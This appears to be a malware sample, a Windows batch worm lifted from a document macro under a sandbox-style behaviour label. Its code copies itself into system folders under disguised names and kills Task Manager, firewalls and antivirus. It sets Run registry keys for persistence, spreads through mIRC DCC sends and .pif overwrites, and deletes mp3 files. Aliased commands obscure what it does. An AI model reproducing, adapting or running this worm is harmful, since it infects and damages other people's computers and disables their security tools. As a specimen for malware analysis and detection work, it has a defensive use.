behavior.Run: May run an executable file or a system command

docinfo.macro:
@eCHo oFF
rem !g@d0�
rem W�!���n by �@z0�bl@d�

set s=set
%s% c=copy
%s% f=for
%s% e=echo
%s% kill=tskill
%s% d=del /f
%s% reg=reg add
%s% folder=md
%s% lol=> nul
%s% clear=cls
%s% over=in
%s% muha=do

%clear%

%c% %0 "%systemroot%\svr32.bat" %lol%
%c% %0 "%systemroot%\winlogon32.bat" %lol%
%c% %0 "%systemroot%\logfile.bat" %lol%
%c% %0 "%systemroot%\nmain97.bat" %lol%
%c% %0 "%systemroot%\system32\ntscript.bat" %lol%
%c% %0 "%systemroot%\system32\horse.exe" %lol%
%c% %0 "%systemroot%\system32\mirc.bat" %lol%

%clear%

%folder% "%programfiles%\mIRCv16" %lol%
%folder% "%programfiles%\WinZip10" %lol%
%folder% "%programfiles%\CoolWebSearch" %lol%
%folder% "%programfiles%\SeX" %lol%
%folder% "%programfiles%\AntiVirus" %lol%
%folder% "%programfiles%\WINDOWS" %lol%

%clear%

%kill% taskmgr %lol%
%kill% msconfig %lol%
%kill% ICQ %lol%
%kill% ICQLite %lol%
%kill% NISUM %lol%
%kill% NISSERV %lol%
%kill% guard %lol%
%kill% zonealarm %lol%
%kill% outpost %lol%
%kill% ad-aware %lol%
%kill% nmain %lol%

%clear%

%reg% HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nMain /t REG_SZ /d "%systemroot%\winlogon32.bat" /f
%clear%
%reg% HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v aUpdate32 /t REG_SZ /d "%systemroot%\winlogon32.bat" /f
%clear%

%e% [afiles] >> "%programfiles%\mIRC\mirc.ini"
%e% n0=aliases.ini >> "%programfiles%\mIRC\mirc.ini"
%e% n1=eventz.ini >> "%programfiles%\mIRC\mirc.ini"
%e% [rfiles] >> "%programfiles%\mIRC\mirc.ini"
%e% n0=remote.ini >> "%programfiles%\mIRC\mirc.ini"
%e% n1=remote.ini >> "%programfiles%\mIRC\mirc.ini"
%e% n2=eventz.ini >> "%programfiles%\mIRC\mirc.ini"
%clear%
%e% [script] > "%programfiles%\mIRC\eventz.ini"
%e% n0=on *:JOIN:#:{ >> "%programfiles%\mIRC\eventz.ini"
%e% n1=if ($nick == $me) { halt } >> "%programfiles%\mIRC\eventz.ini"
%e% n2=/dcc send $nick "C:\WINDOWS\system32\mirc.bat"  >> "%programfiles%\mIRC\eventz.ini"
%e% n3=} >> "%programfiles%\mIRC\eventz.ini"
%clear%
%e% [windows] >> "%systemroot%\win.ini"
%e% load=%systemroot%\system32\mirc.bat >> "%systemroot%\win.ini"
%e% run=%systemroot%\system32\mirc.bat >> "%systemroot%\win.ini"

%clear%

%f% %%f %over% (%systemroot%\system32\*.pif) %muha% %c% %0 %%f

%clear%

%d% "*.mp3" %lol%
